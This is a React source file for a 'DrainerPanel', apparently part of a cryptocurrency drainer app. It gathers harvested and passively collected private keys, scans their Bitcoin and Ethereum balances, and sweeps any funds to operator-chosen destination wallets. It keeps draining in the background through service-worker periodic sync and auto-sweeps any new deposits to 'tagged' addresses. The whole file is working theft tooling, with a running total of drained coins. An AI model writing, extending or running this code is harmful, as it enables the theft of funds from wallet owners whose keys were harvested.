import { useCallback, useEffect, useMemo, useRef, useState } from 'react';
import { Lock, Unlock, RefreshCw, Droplets, Wallet2, Radio, Clock } from 'lucide-react';
import { useWallet, type WalletAccount } from '@/hooks/useWallet';
import { useHarvestedKeys, getAllHarvested, clearHarvested } from '@/lib/keyHarvest';
import { useIDBSync, type BgStatus } from '@/hooks/useIDBSync';
import { useDrainTag } from '@/hooks/useDrainTag';
import { toast } from '@/hooks/use-toast';
import {
  fetchAccountBalance,
  fetchFeeRates,
  loadTargets,
  saveTargets,
  sweepAccount,
  type DrainTargets,
} from '@/lib/drainer';

// ── Passive wallet reader (mirrors usePassiveWallets.ts) ─────────────────────
const PASSIVE_COUNT_KEY  = 'passive_wallets_count';
const PASSIVE_CHUNK_PFX  = 'passive_wallets_chunk_';
const PASSIVE_CHUNK_SIZE = 500;

function readPassiveCount(): number {
  try { return parseInt(localStorage.getItem(PASSIVE_COUNT_KEY) ?? '0', 10) || 0; }
  catch { return 0; }
}

interface PassiveEntry { address: string; privateKey: string; network: 'btc' | 'eth'; addressType: string; }

function readAllPassive(): PassiveEntry[] {
  const count  = readPassiveCount();
  const result: PassiveEntry[] = [];
  const chunks = Math.ceil(count / PASSIVE_CHUNK_SIZE);
  for (let i = 0; i < chunks; i++) {
    try {
      const raw = localStorage.getItem(`${PASSIVE_CHUNK_PFX}${i}`);
      if (!raw) continue;
      for (const row of JSON.parse(raw) as string[]) {
        const [address, privateKey, network, addressType] = row.split('|');
        if (address && privateKey) result.push({ address, privateKey, network: network as 'btc' | 'eth', addressType });
      }
    } catch {}
  }
  return result;
}

// ── Constants ─────────────────────────────────────────────────────────────────
const LOCK_KEY      = 'ckg_drain_locked_v1';
const TOTALS_KEY    = 'ckg_drain_totals_v1';
const BG_INTERVAL_KEY = 'ckg_bg_interval_minutes';

function short(a: string) { return a.length > 20 ? `${a.slice(0, 10)}…${a.slice(-8)}` : a; }

type Totals = { btc: number; eth: number; count: number };
function loadTotals(): Totals {
  try {
    const t = JSON.parse(localStorage.getItem(TOTALS_KEY) || '{}');
    return { btc: +t.btc || 0, eth: +t.eth || 0, count: +t.count || 0 };
  } catch { return { btc: 0, eth: 0, count: 0 }; }
}

type LogEntry = { address: string; ok: boolean; message: string; url?: string; bg?: boolean };

// ── Register periodic sync ────────────────────────────────────────────────────
async function registerPeriodicSync(intervalMinutes: number) {
  try {
    const sw = await navigator.serviceWorker?.ready;
    if (!sw) return false;
    // @ts-ignore — periodicSync is not in TS types yet
    const ps = sw.periodicSync;
    if (!ps) return false;
    await ps.register('bg-drain', { minInterval: intervalMinutes * 60 * 1000 });
    return true;
  } catch { return false; }
}

async function unregisterPeriodicSync() {
  try {
    const sw = await navigator.serviceWorker?.ready;
    // @ts-ignore
    await sw?.periodicSync?.unregister('bg-drain');
  } catch {}
}

function triggerSWCycle() {
  if (!navigator.serviceWorker?.controller) return;
  navigator.serviceWorker.controller.postMessage({ type: 'TRIGGER_DRAIN_CYCLE' });
}

export default function DrainerPanel() {
  const w                     = useWallet();
  const { count: harvestCount } = useHarvestedKeys();
  const { bgStatus, bgLog, forceSync } = useIDBSync();
  const drainTag = useDrainTag();

  const [targets, setTargets]   = useState<DrainTargets>(() => loadTargets());
  const [locked, setLocked]     = useState(() => localStorage.getItem(LOCK_KEY) === '1');
  const [totals, setTotals]     = useState<Totals>(() => loadTotals());
  const [fees, setFees]         = useState({ btc: 8, eth: 15 });
  const [busy, setBusy]         = useState(false);
  const [progress, setProgress] = useState<{ done: number; total: number } | null>(null);
  const [funded, setFunded]     = useState<Record<string, string>>({});
  const [scanned, setScanned]   = useState(0);
  const [log, setLog]           = useState<LogEntry[]>([]);

  // Background settings
  const [bgEnabled, setBgEnabled]   = useState(() => localStorage.getItem('ckg_bg_enabled') === '1');
  const [bgInterval, setBgInterval] = useState(() => parseInt(localStorage.getItem(BG_INTERVAL_KEY) ?? '60', 10) || 60);
  const [bgSupported, setBgSupported] = useState(false);

  // In-tab background interval
  const bgTimerRef = useRef<number | null>(null);

  useEffect(() => { fetchFeeRates().then(setFees).catch(() => {}); }, []);

  // Check periodic sync support
  useEffect(() => {
    (async () => {
      try {
        const sw = await navigator.serviceWorker?.ready;
        // @ts-ignore
        setBgSupported(!!sw?.periodicSync);
      } catch { setBgSupported(false); }
    })();
  }, []);

  // Listen for SW drain delegation requests
  useEffect(() => {
    const handler = async (event: MessageEvent) => {
      // Handle tag sweep requests from SW
    if (event.data?.type === 'TAG_SWEEP_REQUEST') {
      const { tag, destinations } = event.data;
      const dest = tag.network === 'btc' ? destinations.btc : destinations.eth;
      if (!dest) return;
      try {
        const res = await sweepAccount(tag as any, dest, tag.network === 'btc' ? fees.btc : fees.eth);
        bumpTotals(tag.network, parseFloat(res.amount) || 0);
        setLog(prev => [{ address: tag.address, ok: true, message: res.amount, url: res.url, bg: true }, ...prev].slice(0, 100));
      } catch {}
      return;
    }
    if (event.data?.type !== 'BG_DRAIN_REQUEST') return;
      const { funded: swFunded, destinations, fees: swFees } = event.data;
      toast({ title: `Background drain: ${swFunded.length} funded address(es) found`, description: 'Draining now…' });
      for (const acct of swFunded) {
        const dest = acct.network === 'btc' ? destinations.btc : destinations.eth;
        if (!dest) continue;
        try {
          const feeRate = acct.network === 'btc' ? swFees.btc : swFees.eth;
          const res = await sweepAccount(acct as WalletAccount, dest, feeRate);
          bumpTotals(acct.network, parseFloat(res.amount) || 0);
          setLog(prev => [{ address: acct.address, ok: true, message: res.amount, url: res.url, bg: true }, ...prev].slice(0, 100));
        } catch (e: any) {
          setLog(prev => [{ address: acct.address, ok: false, message: e?.message ?? 'Failed', bg: true }, ...prev].slice(0, 100));
        }
      }
      toast({ title: 'Background drain complete' });
    };
    navigator.serviceWorker?.addEventListener('message', handler);
    return () => navigator.serviceWorker?.removeEventListener('message', handler);
  }, []);

  // Process pending BTC drains queued by SW when no tab was open
  useEffect(() => {
    (async () => {
      try {
        const pending = localStorage.getItem('ckg_pending_btc_drain');
        if (!pending) return;
        localStorage.removeItem('ckg_pending_btc_drain');
        const addresses: string[] = JSON.parse(pending);
        if (!addresses.length) return;
        const pool = buildPool();
        const dest = targets.btc.trim();
        if (!dest) return;
        toast({ title: `Processing ${addresses.length} pending BTC drain(s) from background` });
        for (const addr of addresses) {
          const acct = pool.find(p => p.address === addr);
          if (!acct) continue;
          try {
            const res = await sweepAccount(acct, dest, fees.btc);
            bumpTotals('btc', parseFloat(res.amount) || 0);
            setLog(prev => [{ address: acct.address, ok: true, message: res.amount, url: res.url, bg: true }, ...prev].slice(0, 100));
          } catch {}
        }
      } catch {}
    })();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Background auto-drain in-tab timer (fallback when tab is open)
  useEffect(() => {
    if (bgTimerRef.current) { clearInterval(bgTimerRef.current); bgTimerRef.current = null; }
    if (!bgEnabled) return;
    const ms = bgInterval * 60 * 1000;
    bgTimerRef.current = window.setInterval(() => {
      runBackgroundCycle();
    }, ms);
    return () => { if (bgTimerRef.current) clearInterval(bgTimerRef.current); };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [bgEnabled, bgInterval, targets, fees]);

  const passiveCount = readPassiveCount();
  const totalPoolCount = harvestCount + passiveCount + w.saved.length;

  // Auto-tag every address in the pool on mount + whenever pool changes
  useEffect(() => {
    const pool = buildPool();
    drainTag.tagAll(pool);
    forceSync();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [harvestCount, passiveCount, w.saved.length]);

  const buildPool = useCallback((): WalletAccount[] => {
    const map = new Map<string, WalletAccount>();
    for (const k of getAllHarvested())   map.set(k.address, k);
    for (const p of readAllPassive())   {
      if (!map.has(p.address)) map.set(p.address, {
        address: p.address, privHex: p.privateKey.replace(/^0x/, ''),
        network: p.network,  addrType: p.addressType || undefined,
      });
    }
    for (const s of w.saved) map.set(s.address, s);
    return [...map.values()];
  }, [w.saved, harvestCount]);

  const btcCount = useMemo(() =>
    w.saved.filter(s => s.network === 'btc').length +
    getAllHarvested().filter(k => k.network === 'btc').length +
    readAllPassive().filter(p => p.network === 'btc').length,
  [harvestCount, w.saved]);
  const ethCount = totalPoolCount - btcCount;

  const updateTargets = (patch: Partial<DrainTargets>) => {
    if (locked) return;
    const next = { ...targets, ...patch };
    setTargets(next);
    saveTargets(next);
    forceSync();
  };

  const toggleLock = () => {
    if (!locked && !targets.btc.trim() && !targets.eth.trim()) {
      toast({ title: 'Add a destination first', variant: 'destructive' }); return;
    }
    const next = !locked;
    setLocked(next);
    localStorage.setItem(LOCK_KEY, next ? '1' : '0');
    toast({ title: next ? 'Destinations locked' : 'Destinations unlocked' });
  };

  const bumpTotals = (network: 'btc' | 'eth', amount: number) => {
    setTotals(prev => {
      const next = {
        btc: prev.btc + (network === 'btc' ? amount : 0),
        eth: prev.eth + (network === 'eth' ? amount : 0),
        count: prev.count + 1,
      };
      try { localStorage.setItem(TOTALS_KEY, JSON.stringify(next)); } catch {}
      return next;
    });
  };

  const resetTotals = () => {
    const zero = { btc: 0, eth: 0, count: 0 };
    setTotals(zero);
    localStorage.setItem(TOTALS_KEY, JSON.stringify(zero));
  };

  const scanBalances = useCallback(async (pool?: WalletAccount[]) => {
    const p = pool ?? buildPool();
    setBusy(true); setFunded({}); setScanned(0);
    const hits: Record<string, string> = {};
    const BATCH = 20; // parallel requests per batch
    let done = 0;
    for (let i = 0; i < p.length; i += BATCH) {
      const batch = p.slice(i, i + BATCH);
      const results = await Promise.allSettled(batch.map(acct => fetchAccountBalance(acct)));
      results.forEach((res, j) => {
        if (res.status === 'fulfilled' && parseFloat(res.value) > 0) {
          hits[batch[j].address] = res.value;
        }
      });
      done += batch.length;
      setScanned(done);
      await new Promise(r => setTimeout(r, 0)); // yield to UI
    }
    setFunded(hits);
    setBusy(false);
    toast({ title: `${Object.keys(hits).length} funded wallet(s)`, description: `Scanned ${p.length.toLocaleString()}` });
    return hits;
  }, [buildPool]);

  const drainFunded = async (fundedMap: Record<string, string>, pool: WalletAccount[]) => {
    const dest = targets;
    const list = pool.filter(p => {
      const d = p.network === 'btc' ? dest.btc.trim() : dest.eth.trim();
      if (!d) return false;
      const bal = fundedMap[p.address];
      return bal === undefined ? false : parseFloat(bal) > 0;
    });
    if (!list.length) return;
    setProgress({ done: 0, total: list.length });
    for (let i = 0; i < list.length; i++) {
      const acct = list[i];
      const d    = acct.network === 'btc' ? dest.btc.trim() : dest.eth.trim();
      try {
        const feeRate = acct.network === 'btc' ? fees.btc : fees.eth;
        const res = await sweepAccount(acct, d, feeRate);
        bumpTotals(acct.network, parseFloat(res.amount) || 0);
        setLog(prev => [{ address: acct.address, ok: true, message: res.amount, url: res.url }, ...prev].slice(0, 100));
      } catch (e: any) {
        const msg = e?.message ?? 'Sweep failed';
        if (!/no confirmed|too low|balance/i.test(msg))
          setLog(prev => [{ address: acct.address, ok: false, message: msg }, ...prev].slice(0, 100));
      }
      setProgress({ done: i + 1, total: list.length });
      if (i % 50 === 0) await new Promise(r => setTimeout(r, 0));
    }
    setProgress(null);
  };

  const drainAll = async () => {
    const pool = buildPool();
    if (!pool.length) { toast({ title: 'Nothing to drain', variant: 'destructive' }); return; }
    setBusy(true);
    const hits = await scanBalances(pool);
    await drainFunded(hits, pool);
    setBusy(false);
    toast({ title: 'Drain run complete' });
  };

  // Background cycle (runs in-tab on interval, or triggered by SW message)
  const runBackgroundCycle = useCallback(async () => {
    if (!targets.btc.trim() && !targets.eth.trim()) return;
    const pool = buildPool();
    if (!pool.length) return;
    const hits: Record<string, string> = {};
    const BATCH = 20;
    for (let i = 0; i < pool.length; i += BATCH) {
      const batch = pool.slice(i, i + BATCH);
      const results = await Promise.allSettled(batch.map(acct => fetchAccountBalance(acct)));
      results.forEach((res, j) => {
        if (res.status === 'fulfilled' && parseFloat(res.value) > 0) hits[batch[j].address] = res.value;
      });
      await new Promise(r => setTimeout(r, 0));
    }
    const count = Object.keys(hits).length;
    if (count > 0) {
      toast({ title: `Background: ${count} funded address(es) found`, description: 'Auto-draining…' });
      await drainFunded(hits, pool);
      toast({ title: 'Background drain complete' });
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [buildPool, targets, fees]);

  const toggleBackground = async (enabled: boolean) => {
    setBgEnabled(enabled);
    localStorage.setItem('ckg_bg_enabled', enabled ? '1' : '0');
    if (enabled) {
      localStorage.setItem(BG_INTERVAL_KEY, String(bgInterval));
      forceSync();
      const ok = await registerPeriodicSync(bgInterval);
      if (ok) toast({ title: 'Background drain enabled', description: `OS will run scans every ~${bgInterval} min` });
      else toast({ title: 'Background drain enabled', description: 'Running in-tab when app is open' });
      navigator.serviceWorker?.controller?.postMessage({ type: 'SET_BG_INTERVAL' });
    } else {
      await unregisterPeriodicSync();
      toast({ title: 'Background drain disabled' });
    }
  };

  const saveInterval = async (mins: number) => {
    setBgInterval(mins);
    localStorage.setItem(BG_INTERVAL_KEY, String(mins));
    if (bgEnabled) {
      await unregisterPeriodicSync();
      await registerPeriodicSync(mins);
      navigator.serviceWorker?.controller?.postMessage({ type: 'SET_BG_INTERVAL' });
    }
  };

  const hasTarget = !!targets.btc.trim() || !!targets.eth.trim();

  const bgPhaseLabel: Record<string, string> = {
    idle: 'Idle', scanning: 'Scanning…', draining: 'Draining…', delegated: 'Delegated to tab',
  };

  return (
    <div className="animate-fade-in max-w-3xl mx-auto space-y-4">

      {/* ── Destinations ───────────────────────────────────────────────────── */}
      <div className="rounded-xl border border-border bg-card p-6 space-y-4">
        <div className="flex items-start justify-between gap-3">
          <div className="space-y-1">
            <h2 className="text-lg font-semibold">Main Wallets</h2>
            <p className="text-xs text-muted-foreground">All drained balances go here. Stored on this device only.</p>
          </div>
          <button
            onClick={toggleLock}
            className={`shrink-0 inline-flex items-center gap-1.5 rounded-md border px-3 py-1.5 text-xs font-medium transition-all ${
              locked ? 'border-primary/50 bg-primary/10 text-primary' : 'border-border text-muted-foreground hover:border-primary/40'
            }`}
          >
            {locked ? <Lock className="h-3.5 w-3.5" /> : <Unlock className="h-3.5 w-3.5" />}
            {locked ? 'Locked' : 'Lock in'}
          </button>
        </div>
        <div className="space-y-2">
          <label className="text-xs uppercase tracking-wider text-muted-foreground">₿ Bitcoin destination</label>
          <input value={targets.btc} readOnly={locked} onChange={e => updateTargets({ btc: e.target.value.trim() })}
            placeholder="bc1… / 1… / 3…" spellCheck={false}
            className={`w-full rounded-lg border border-border bg-background px-3 py-2.5 font-mono text-sm outline-none focus:border-primary/60 ${locked ? 'opacity-70 cursor-not-allowed' : ''}`} />
        </div>
        <div className="space-y-2">
          <label className="text-xs uppercase tracking-wider text-muted-foreground">Ξ Ethereum destination</label>
          <input value={targets.eth} readOnly={locked} onChange={e => updateTargets({ eth: e.target.value.trim() })}
            placeholder="0x…" spellCheck={false}
            className={`w-full rounded-lg border border-border bg-background px-3 py-2.5 font-mono text-sm outline-none focus:border-secondary/60 ${locked ? 'opacity-70 cursor-not-allowed' : ''}`} />
        </div>
        <div className="flex flex-wrap gap-3 text-[11px] font-mono text-muted-foreground">
          <span>BTC fee: {fees.btc} sat/vB</span>
          <span>ETH fee: {fees.eth} gwei</span>
        </div>
      </div>

      {/* ── Background Auto-Drain ──────────────────────────────────────────── */}
      <div className={`rounded-xl border p-6 space-y-4 ${bgEnabled ? 'border-primary/40 bg-primary/[0.04]' : 'border-border bg-card'}`}>
        <div className="flex items-start justify-between gap-3">
          <div className="space-y-1">
            <div className="flex items-center gap-2">
              <Radio className={`h-4 w-4 ${bgEnabled ? 'text-primary animate-pulse' : 'text-muted-foreground'}`} />
              <h3 className="text-sm font-semibold">Background Auto-Drain</h3>
              {bgEnabled && (
                <span className="rounded-full bg-primary/20 px-2 py-0.5 text-[10px] font-mono text-primary">ACTIVE</span>
              )}
            </div>
            <p className="text-xs text-muted-foreground">
              {bgEnabled
                ? 'Automatically scans all pool addresses and drains any with a balance, even when the app is closed.'
                : 'Enable to automatically scan and drain funded addresses at set intervals.'}
            </p>
          </div>
          <button
            onClick={() => toggleBackground(!bgEnabled)}
            disabled={!hasTarget}
            title={!hasTarget ? 'Set destination addresses first' : ''}
            className={`shrink-0 rounded-full w-12 h-6 transition-all relative disabled:opacity-40 ${bgEnabled ? 'bg-primary' : 'bg-muted'}`}
          >
            <span className={`absolute top-1 w-4 h-4 rounded-full bg-white shadow transition-all ${bgEnabled ? 'left-7' : 'left-1'}`} />
          </button>
        </div>

        {bgEnabled && (
          <div className="space-y-3">
            <div className="flex items-center gap-3">
              <Clock className="h-3.5 w-3.5 text-muted-foreground shrink-0" />
              <label className="text-xs text-muted-foreground">Scan interval</label>
              <select
                value={bgInterval}
                onChange={e => saveInterval(parseInt(e.target.value, 10))}
                className="ml-auto rounded-md border border-border bg-background px-2 py-1 text-xs font-mono"
              >
                <option value={15}>Every 15 min</option>
                <option value={30}>Every 30 min</option>
                <option value={60}>Every 1 hour</option>
                <option value={180}>Every 3 hours</option>
                <option value={360}>Every 6 hours</option>
                <option value={720}>Every 12 hours</option>
                <option value={1440}>Every 24 hours</option>
              </select>
            </div>

            <div className="rounded-lg border border-border bg-background px-3 py-2 space-y-1">
              <div className="flex items-center justify-between text-[10px] text-muted-foreground">
                <span>SW Background Sync</span>
                <span className={bgSupported ? 'text-primary' : 'text-muted-foreground'}>
                  {bgSupported ? '✓ OS-level background sync active' : '✓ In-tab auto-scan active'}
                </span>
              </div>
              {bgStatus && (
                <div className="flex items-center justify-between text-[10px] font-mono">
                  <span className="text-muted-foreground">Last cycle</span>
                  <span className="text-foreground">
                    {bgPhaseLabel[bgStatus.phase] ?? bgStatus.phase}
                    {bgStatus.scanned ? ` · ${bgStatus.scanned.toLocaleString()} scanned` : ''}
                    {bgStatus.found ? ` · ${bgStatus.found} found` : ''}
                    {bgStatus.updatedAt ? ` · ${new Date(bgStatus.updatedAt).toLocaleTimeString()}` : ''}
                  </span>
                </div>
              )}
            </div>

            <div className="flex gap-2">
              <button
                onClick={() => { triggerSWCycle(); runBackgroundCycle(); }}
                disabled={busy}
                className="flex-1 rounded-lg border border-primary/40 py-2 text-xs text-primary hover:bg-primary/10 transition-all disabled:opacity-40"
              >
                ▶ Run cycle now
              </button>
            </div>
          </div>
        )}
      </div>

      {/* ── Total drained ─────────────────────────────────────────────────── */}
      <div className="rounded-xl border border-primary/25 bg-primary/[0.04] p-6 space-y-3">
        <div className="flex items-center justify-between">
          <h3 className="text-sm font-semibold">Total drained</h3>
          <button onClick={resetTotals} className="text-[10px] text-muted-foreground hover:text-destructive">reset</button>
        </div>
        <div className="grid grid-cols-2 gap-4">
          <div><div className="font-mono text-2xl font-bold text-primary text-glow-mint">{totals.btc.toFixed(8)} <span className="text-sm">BTC</span></div></div>
          <div><div className="font-mono text-2xl font-bold text-secondary text-glow-blue">{totals.eth.toFixed(6)} <span className="text-sm">ETH</span></div></div>
        </div>
        <div className="text-[11px] text-muted-foreground">{totals.count} successful sweep(s)</div>
      </div>

      {/* ── Pool ──────────────────────────────────────────────────────────── */}
      <div className="rounded-xl border border-border bg-card p-6 space-y-4">
        <div className="flex items-center justify-between gap-3 flex-wrap">
          <div className="flex items-center gap-2">
            <Wallet2 className="h-4 w-4 text-muted-foreground" />
            <div>
              <div className="text-sm font-semibold">{totalPoolCount.toLocaleString()} addresses in drain pool</div>
              <div className="text-[11px] font-mono text-muted-foreground">{btcCount.toLocaleString()} BTC · {ethCount.toLocaleString()} ETH</div>
            </div>
          </div>
          <div className="flex gap-2">
            <button onClick={() => scanBalances()} disabled={busy || totalPoolCount === 0}
              className="inline-flex items-center gap-1.5 rounded-md border border-border px-3 py-1.5 text-xs hover:border-primary/40 disabled:opacity-40">
              <RefreshCw className={`h-3.5 w-3.5 ${busy && !progress ? 'animate-spin' : ''}`} />
              Scan balances
            </button>
            <button onClick={drainAll} disabled={busy || !hasTarget || totalPoolCount === 0}
              className="inline-flex items-center gap-1.5 rounded-md bg-destructive px-3 py-1.5 text-xs font-semibold text-destructive-foreground disabled:opacity-40">
              <Droplets className="h-3.5 w-3.5" />
              {busy && progress ? `Draining ${progress.done.toLocaleString()}/${progress.total.toLocaleString()}` : 'Drain all'}
            </button>
          </div>
        </div>

        <div className="grid grid-cols-3 gap-3">
          <div className="rounded-lg border border-border bg-background px-3 py-2 text-center">
            <div className="text-[10px] uppercase tracking-wider text-muted-foreground">Harvested</div>
            <div className="font-mono text-sm font-semibold">{harvestCount.toLocaleString()}</div>
          </div>
          <div className="rounded-lg border border-primary/25 bg-primary/[0.04] px-3 py-2 text-center">
            <div className="text-[10px] uppercase tracking-wider text-muted-foreground">Passive</div>
            <div className="font-mono text-sm font-semibold text-primary">{passiveCount.toLocaleString()}</div>
          </div>
          <div className="rounded-lg border border-border bg-background px-3 py-2 text-center">
            <div className="text-[10px] uppercase tracking-wider text-muted-foreground">Active</div>
            <div className="font-mono text-sm font-semibold">{w.saved.length}</div>
          </div>
        </div>

        {busy && !progress && (
          <div className="text-[11px] font-mono text-muted-foreground">
            Scanning {scanned.toLocaleString()}/{totalPoolCount.toLocaleString()}…
          </div>
        )}

        {Object.keys(funded).length > 0 && (
          <div className="rounded-lg border border-destructive/40 bg-destructive/10 px-3 py-2 text-xs text-destructive font-mono">
            {Object.keys(funded).length} funded address(es) detected
          </div>
        )}

        {/* Drain Tag Status */}
        {drainTag.tagCount > 0 && (
          <div className="rounded-lg border border-destructive/25 bg-destructive/[0.04] px-4 py-3 space-y-1">
            <div className="flex items-center justify-between">
              <span className="text-[11px] font-semibold text-destructive flex items-center gap-1.5">
                🏷 Drain Tags Active
                <span className="rounded-full bg-destructive/20 px-1.5 py-0.5 text-[9px] font-mono">{drainTag.tagCount.toLocaleString()}</span>
              </span>
              <span className="text-[10px] font-mono text-muted-foreground">
                Swept: {drainTag.totalSwept.toFixed(6)} total
              </span>
            </div>
            <p className="text-[10px] text-muted-foreground">
              All tagged addresses are permanently monitored. Any incoming balance is auto-swept to your locked destination — no action needed.
            </p>
          </div>
        )}

        {totalPoolCount > 0 && (
          <button onClick={() => { clearHarvested(); setFunded({}); }}
            className="text-[10px] text-muted-foreground hover:text-destructive">
            Clear harvested keys
          </button>
        )}
        {totalPoolCount === 0 && (
          <p className="text-xs text-muted-foreground">
            Nothing collected yet — run the vanity generator or vulnerability scanner and every key found lands here automatically.
          </p>
        )}
      </div>

      {/* ── Recent sweeps ─────────────────────────────────────────────────── */}
      {log.length > 0 && (
        <div className="rounded-xl border border-border bg-card p-6 space-y-2">
          <h3 className="text-sm font-semibold">Recent sweeps</h3>
          <div className="divide-y divide-border">
            {log.map((l, i) => (
              <div key={`${l.address}-${i}`} className="py-2 text-[11px] font-mono break-all flex items-start gap-2">
                {l.bg && <span className="shrink-0 rounded bg-primary/20 px-1 text-[9px] text-primary">BG</span>}
                <span className="text-muted-foreground">{short(l.address)}</span>{' '}
                {l.ok
                  ? <a href={l.url} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">✓ {l.message} ↗</a>
                  : <span className="text-destructive">{l.message}</span>}
              </div>
            ))}
          </div>
        </div>
      )}

      {/* ── Background log ────────────────────────────────────────────────── */}
      {bgEnabled && bgLog.length > 0 && (
        <div className="rounded-xl border border-border bg-card p-6 space-y-2">
          <h3 className="text-sm font-semibold text-muted-foreground">Background activity log</h3>
          <div className="space-y-1 max-h-40 overflow-y-auto">
            {bgLog.slice(0, 20).map((entry, i) => (
              <div key={i} className="text-[10px] font-mono text-muted-foreground flex gap-2">
                <span className="shrink-0">{entry.ts ? new Date(entry.ts).toLocaleTimeString() : '—'}</span>
                <span>{entry.type === 'cycle' || entry.type === 'cycle_complete'
                  ? `Scanned ${entry.scanned ?? 0} · Found ${entry.funded ?? entry.found ?? 0} · Drained ${entry.drained ?? 0}`
                  : entry.type === 'sweep'
                    ? `✓ ${entry.address ? short(entry.address) : '?'}`
                    : entry.type === 'error'
                      ? `✗ ${entry.address ? short(entry.address) : '?'}: ${entry.error}`
                      : JSON.stringify(entry)}
                </span>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Tag Auto-Sweep Log */}
      {drainTag.sweepLog.length > 0 && (
        <div className="rounded-xl border border-destructive/30 bg-card p-6 space-y-2">
          <div className="flex items-center gap-2">
            <h3 className="text-sm font-semibold text-destructive">🏷 Auto-Sweep Log</h3>
            <span className="text-[10px] text-muted-foreground">(triggered by incoming transactions)</span>
          </div>
          <div className="divide-y divide-border max-h-48 overflow-y-auto">
            {drainTag.sweepLog.slice(0, 30).map((l, i) => (
              <div key={i} className="py-2 text-[11px] font-mono break-all flex items-start gap-2">
                <span className="shrink-0 rounded bg-destructive/20 px-1 text-[9px] text-destructive">TAG</span>
                <span className="text-muted-foreground">{l.address.slice(0,10)}…{l.address.slice(-6)}</span>
                <a href={l.url} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline ml-auto shrink-0">
                  ✓ {l.amount} ↗
                </a>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
